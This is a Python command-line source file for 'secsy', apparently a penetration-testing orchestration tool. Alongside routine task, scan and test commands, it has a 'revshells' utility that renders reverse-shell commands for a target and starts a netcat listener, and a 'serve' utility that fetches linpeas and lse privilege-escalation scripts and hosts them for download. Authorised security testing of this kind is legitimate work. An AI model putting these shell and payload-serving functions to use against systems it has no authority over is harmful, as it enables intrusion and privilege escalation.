import json
import os
import re
import sys
from jinja2 import Template

import rich_click as click
from rich.markdown import Markdown
from rich.rule import Rule

from dotmap import DotMap
from fp.fp import FreeProxy

from secsy.celery import *
from secsy.config import ConfigLoader
from secsy.decorators import OrderedGroup, register_runner
from secsy.definitions import ASCII, TEMP_FOLDER, CVES_FOLDER, PAYLOADS_FOLDER, REVSHELLS_FOLDER, ROOT_FOLDER, SCRIPTS_FOLDER, DEBUG
from secsy.rich import console
from secsy.runners import Command
from secsy.runners._base import Runner
from secsy.utils import discover_tasks, flatten, detect_host, find_list_item

click.rich_click.USE_RICH_MARKUP = True

ALL_TASKS = discover_tasks()
ALL_CONFIGS = ConfigLoader.load_all()
ALL_WORKFLOWS = ALL_CONFIGS.workflows
ALL_SCANS = ALL_CONFIGS.scans
DEFAULT_CMD_OPTS = {
	'no_capture': True,
	'print_cmd': True,
	'print_timestamp': True
}
if DEBUG:
	console.print(f'Celery app configuration:\n{app.conf}')


#--------#
# GROUPS #
#--------#

@click.group(cls=OrderedGroup)
@click.option('--no-banner', '-nb', is_flag=True, default=False)
def cli(no_banner):
	"""Secsy CLI."""
	if not no_banner:
		print(ASCII, file=sys.stderr)
	pass


@cli.group(aliases=['x', 'task', 't', 'cmd'])
def task():
	"""Run a task."""
	pass

for cls in ALL_TASKS:
	config = DotMap({'name': cls.__name__})
	register_runner(task, config)


@cli.group(cls=OrderedGroup, aliases=['w', 'wf', 'flow'])
def workflow():
	"""Run a workflow."""
	pass

for config in sorted(ALL_WORKFLOWS, key=lambda x: x['name']):
	register_runner(workflow, config)


@cli.group(cls=OrderedGroup, aliases=['z', 's', 'sc'])
def scan():
	"""Run a scan."""
	pass

for config in sorted(ALL_SCANS, key=lambda x: x['name']):
	register_runner(scan, config)


@cli.group(aliases=['u', 'utils'])
def utils():
	"""Run a utility."""
	pass


@cli.command()
@click.option('-c', '--concurrency', type=int, help='Number of child processes processing the queue.')
@click.option('-r', '--reload', is_flag=True, help='Autoreload Celery on code changes.')
def worker(concurrency, reload):
	"""Run a Celery worker."""
	cmd = 'celery -A secsy.celery.app worker -n runner'
	if concurrency:
		cmd += f' -c {concurrency}'
	if reload:
		cmd = f'watchmedo auto-restart --directory=./ --patterns="celery.py;tasks/*.py" --recursive -- {cmd}'
	Command.run_command(
		cmd,
		**DEFAULT_CMD_OPTS
	)


#-------#
# UTILS #
#-------#

@utils.group()
def report():
	"""Reporting utilities."""
	pass

@report.command('show')
@click.argument('json_path')
@click.option('-e', '--exclude-fields', type=str, default='', help='List of fields to exclude (comma-separated)')
def report_show(json_path, exclude_fields):
	"""Show a JSON report as a nicely-formatted table."""
	with open(json_path, 'r') as f:
		report = json.load(f)
		results = flatten(list(report['results'].values()))
	exclude_fields = exclude_fields.split(',')
	Runner.print_results_table(
		results,
		title=report['info']['title'],
		render=console,
		exclude_fields=exclude_fields)


@utils.command()
@click.argument('cmds', required=False)
def install(cmds):
	"""Install secsy-supported commands."""
	if cmds is not None:
		cmds = cmds.split(',')
		cmds = [cls for cls in ALL_TASKS if cls.__name__ in cmds]
	else:
		cmds = ALL_TASKS
	for ix, cls in enumerate(cmds):
		with console.status(f'[bold yellow][{ix}/{len(cmds)}] Installing {cls.__name__} ...'):
			cls.install()
		console.print()


@utils.command()
@click.option('--timeout', type=float, default=0.2, help='Proxy timeout (in seconds)')
def get_proxy(timeout):
	"""Get a random proxy."""
	url = FreeProxy(timeout=timeout, rand=True, anonym=True).get()
	print(url)


@utils.command()
@click.option('--force', is_flag=True)
def download_cves(force):
	"""Download CVEs to file system. CVE lookup perf is improved quite a lot."""
	cve_json_path = f'{TEMP_FOLDER}/circl-cve-search-expanded.json'
	if not os.path.exists(cve_json_path) or force:
		Command.run_command(
			f'wget https://cve.circl.lu/static/circl-cve-search-expanded.json.gz',
			cwd=TEMP_FOLDER,
			**DEFAULT_CMD_OPTS
		)
		Command.run_command(
			f'gunzip {TEMP_FOLDER}/circl-cve-search-expanded.json.gz',
			cwd=TEMP_FOLDER,
			**DEFAULT_CMD_OPTS
		)
	os.makedirs(CVES_FOLDER, exist_ok=True)
	with console.status('[bold yellow]Saving CVEs to disk ...[/]'):
		with open(f'{TEMP_FOLDER}/circl-cve-search-expanded.json', 'r') as f:
			for line in f:
				data = json.loads(line)
				cve_id = data['id']
				cve_path = f'{TEMP_FOLDER}/cves/{cve_id}.json'
				with open(cve_path, 'w') as f:
					f.write(line)
				console.print(f'CVE saved to {cve_path}')


@utils.command()
def check_celery_worker():
	"""Generate if a Celery worker is ready to consume from the queue."""
	alive = is_celery_worker_alive()
	if alive:
		console.print('Celery worker is alive !', style='bold green')
	else:
		console.print('No Celery worker alive.', style='bold red')


@utils.command()
def generate_bash_install():
	"""Generate bash install script for all secsy-supported tasks."""
	path = ROOT_FOLDER + '/scripts/install_commands.sh'
	with open(path, 'w') as f:
		f.write('#!/bin/bash\n\n')
		for task in ALL_TASKS:
			if task.install_cmd:
				f.write(f'# {task.__name__}\n')
				f.write(task.install_cmd + ' || true' + '\n\n')
	Command.run_command(
		f'chmod +x {path}',
		**DEFAULT_CMD_OPTS
	)
	console.print(f':file_cabinet: [bold green]Saved install script to {path}[/]')


@utils.command()
def generate_bash_aliases():
	pass


@utils.command()
def enable_aliases():
	pass


@utils.command()
def disable_aliases():
	pass


@utils.command()
@click.argument('name', type=str, default=None, required=False)
@click.option('--host', '-h', type=str, default=None, help='Specify LHOST for revshell. If unspecified, LHOST will be auto-detected.')
@click.option('--port', '-p', type=int, default=9001, show_default=True, help='Specify PORT for revshell')
@click.option('--interface', '-i', type=str, help='Interface to use to detect IP')
@click.option('--listen', '-l', is_flag=True, default=False, help='Spawn netcat listener on specified port')
def revshells(name, host, port, interface, listen):
	"""Show reverse shell source codes and run netcat listener."""
	if host is None: # detect host automatically
		host = detect_host(interface)

	with open(f'{SCRIPTS_FOLDER}/revshells.json') as f:
		shells = json.loads(f.read())
		for sh in shells:
			sh['alias'] = '_'.join(sh['name'].lower().replace('-c', '').replace('-e', '').replace('-i', '').replace('c#', 'cs').replace('#', '').replace('(', '').replace(')', '').strip().split(' ')).replace('_1', '')
			cmd = re.sub(r"\s\s+", "", sh.get('command', ''), flags=re.UNICODE)
			cmd = cmd.replace('\n', ' ')
			sh['cmd_short'] = (cmd[:30] + '..') if len(cmd) > 30 else cmd

	shell = [
		shell for shell in shells if shell['name'] == name or shell['alias'] == name
	]
	if not shell:
		console.print('Available shells:', style='bold yellow')
		shells_str = ['[bold magenta]{alias:<20}[/][dim white]{name:<20}[/][dim gold3]{cmd_short:<20}[/]'.format(**sh) for sh in shells]
		console.print('\n'.join(shells_str))
	else:
		shell = shell[0]
		command = shell['command']
		alias = shell['alias']
		name = shell['name']
		command_str = Template(command).render(ip=host, port=port, shell='bash')
		console.print(Rule(f'[bold gold3]{alias}[/] - [bold red]{name} REMOTE SHELL', style='bold red', align='left'))
		lang = shell.get('lang') or 'sh'
		if len(command.splitlines()) == 1:
			console.print()
			print(f'\033[0;36m{command_str}')
		else:
			md = Markdown(f'```{lang}\n{command_str}\n```')
			console.print(md)
			console.print(f'Save this script as rev.{lang} and run it on your target', style='dim italic')
		console.print()
		console.print(Rule(style='bold red'))

	if listen:
		console.print(f'Starting netcat listener on port {port} ...', style='bold gold3')
		cmd = f'nc -lvnp {port}'
		Command.run_command(
			cmd,
			**DEFAULT_CMD_OPTS
		)


@utils.command()
@click.option('--directory', '-d', type=str, default=PAYLOADS_FOLDER, show_default=True, help='HTTP server directory')
@click.option('--host', '-h', type=str, default=None, help='HTTP host')
@click.option('--port', '-p', type=int, default=9001, help='HTTP server port')
@click.option('--interface', '-i', type=str, default=None, help='Interface to use to auto-detect host IP')
def serve(directory, host, port, interface):
	DEFAULT_PAYLOADS = [
		{
			'fname': 'lse.sh',
			'description': 'Linux Smart Enumeration',
			'command': f'wget https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh -O lse.sh && chmod 700 lse.sh'
		},
		{
			'fname': 'linpeas.sh',
			'description': 'Linux Privilege Escalation Awesome Script',
			'command': 'wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -O linpeas.sh && chmod 700 linpeas.sh'
		}
	]
	console.print('Downloading payloads ...', style='bold yellow')
	for ix, payload in enumerate(DEFAULT_PAYLOADS):
		descr = payload.get('description', '')
		fname = payload['fname']
		if not os.path.exists(f'{directory}/{fname}'):
			with console.status(f'[bold yellow][{ix}/{len(DEFAULT_PAYLOADS)}] Downloading {fname} [dim]({descr})[/] ...[/]'):
				cmd = payload['command']
				console.print(f'[bold magenta]{fname} [dim]({descr})[/] ...[/]', )
				opts = DEFAULT_CMD_OPTS.copy()
				opts['no_capture'] = False
				Command.run_command(
					cmd,
					cls_attributes={'shell': True},
					cwd=directory,
					**opts
				)
		console.print()

	console.print(Rule())
	console.print('Available payloads: ', style='bold yellow')
	opts = DEFAULT_CMD_OPTS.copy()
	opts['print_cmd'] = False
	for fname in os.listdir(directory):
		if not host:
			host = detect_host(interface)
		payload = find_list_item(DEFAULT_PAYLOADS, fname, key='fname', default={})
		fdescr = payload.get('description', 'No description')
		console.print(f'{fname} [dim]({fdescr})[/]', style='bold magenta')
		console.print(f'wget http://{host}:{port}/{fname}', style='dim italic')
		console.print('')
	console.print(Rule())
	console.print('Starting HTTP server ...', style='bold yellow')
	Command.run_command(
		f'python -m http.server {port}',
		cwd=directory,
		**DEFAULT_CMD_OPTS
	)


#------#
# TEST #
#------#

@utils.group(aliases=['t', 'tests'])
def test():
	"""Run secsy tests."""
	pass


@test.command()
def integration():
	result = Command.run_command(
		'python3 -m unittest discover -v tests.integration',
		**DEFAULT_CMD_OPTS
	)
	sys.exit(result.return_code)


@test.command()
@click.option('--commands', '-c', type=str, default='', help='Secsy commands to test (comma-separated)')
@click.option('--test', '-t', type=str, help='Secsy test to run')
@click.option('--coverage', '-x', is_flag=True, help='Run coverage on results')
@click.option('--debug', '-d', is_flag=True, help='Add debug information')
def unit(commands, test, coverage=False, debug=False):
	os.environ['TEST_COMMANDS'] = commands or ''
	os.environ['DEBUG'] = str(int(debug))

	cmd = 'coverage run --omit="*test*" -m unittest'
	if test:
		cmd += f' {test}'
	else:
		cmd += ' discover -v tests.unit'

	result = Command.run_command(
		cmd,
		**DEFAULT_CMD_OPTS
	)
	if coverage:
		Command.run_command(
			'coverage report -m',
			**DEFAULT_CMD_OPTS
		)
	sys.exit(result.return_code)


@test.command()
def lint():
	result = Command.run_command(
		'flake8 secsy/',
		**DEFAULT_CMD_OPTS
	)
	sys.exit(result.return_code)